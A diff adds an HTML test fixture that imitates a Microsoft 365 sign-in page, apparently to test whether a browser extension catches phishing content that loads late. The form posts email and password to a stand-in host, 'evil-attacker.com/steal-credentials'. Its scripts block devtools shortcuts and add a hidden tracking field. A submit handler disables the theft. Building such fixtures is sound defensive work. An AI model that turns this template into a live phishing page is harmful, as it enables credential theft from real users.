@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading...</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      background-color: #f3f3f3;
+      display: grid;
+      place-items: center;
+      height: 100vh;
+      width: 100vw;
+      margin: 0;
+    }
+    .login-container {
+      background: white;
+      padding: 40px;
+      max-width: 440px;
+      width: calc(100% - 40px);
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+      display: none; /* Hidden initially */
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin: 0 0 20px 0;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #8c8c8c;
+      box-sizing: border-box;
+    }
+    button {
+      background-color: #0067b8;
+      border: 1px solid #0067b8;
+      color: white;
+      padding: 12px 24px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 15px;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    .loading {
+      font-size: 18px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div class="loading" id="loading">Loading...</div>
+  <div class="login-container" id="login-form">
+    <div class="logo">
+      <h1>Microsoft 365</h1>
+    </div>
+    <form method="POST" action="https://evil-attacker.com/steal-credentials">
+      <input type="email" name="loginfmt" id="i0116" placeholder="Email, phone, or Skype" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <input type="hidden" name="idPartnerPL">
+      <button type="submit" id="idSIButton9">Sign in</button>
+    </form>
+    <p style="font-size: 13px; color: #666; margin-top: 20px;">
+      Can't access your account?
+    </p>
+  </div>
+  
+  <script>
+    // Simulate delayed content loading - shows login form after 1.5 seconds
+    // This tests the threat-triggered re-scanning feature
+    console.log('[Test Page] Starting delayed load simulation...');
+    
+    setTimeout(function() {
+      console.log('[Test Page] Phase 1: Hiding loading message (500ms)');
+      document.getElementById('loading').style.display = 'none';
+    }, 500);
+    
+    setTimeout(function() {
+      console.log('[Test Page] Phase 2: Showing Microsoft 365 login form (1500ms)');
+      document.getElementById('login-form').style.display = 'block';
+      document.title = 'Microsoft 365 Sign In';
+      
+      // Add additional phishing indicators that appear late
+      console.log('[Test Page] Phase 2: Adding late-loading phishing indicators');
+      
+      // Simulate blocking devtools (common phishing technique)
+      document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        return false;
+      });
+      
+      // Add F12 blocker
+      document.addEventListener('keydown', function(e) {
+        if (e.keyCode === 123) { // F12
+          e.preventDefault();
+          return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) { // Ctrl+Shift+I
+          e.preventDefault();
+          return false;
+        }
+      });
+      
+      console.log('[Test Page] Phase 2: Late-loading content fully loaded');
+    }, 1500);
+    
+    // Additional late-loading content at 2.5 seconds
+    setTimeout(function() {
+      console.log('[Test Page] Phase 3: Adding more phishing indicators (2500ms)');
+      
+      // Add hidden tracking elements
+      const trackingDiv = document.createElement('div');
+      trackingDiv.style.display = 'none';
+      trackingDiv.innerHTML = '<input type="hidden" name="urlMsaSignUp" value="https://evil-attacker.com/track">';
+      document.querySelector('form').appendChild(trackingDiv);
+      
+      console.log('[Test Page] Phase 3: All phishing indicators loaded');
+    }, 2500);
+    
+    document.querySelector('form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      alert('This is a test phishing page with delayed loading. The extension should have detected and blocked this!');
+    });
+    
+    console.log('[Test Page] Initial page load complete - waiting for delayed content...');
+  </script>
+</body>
+</html>
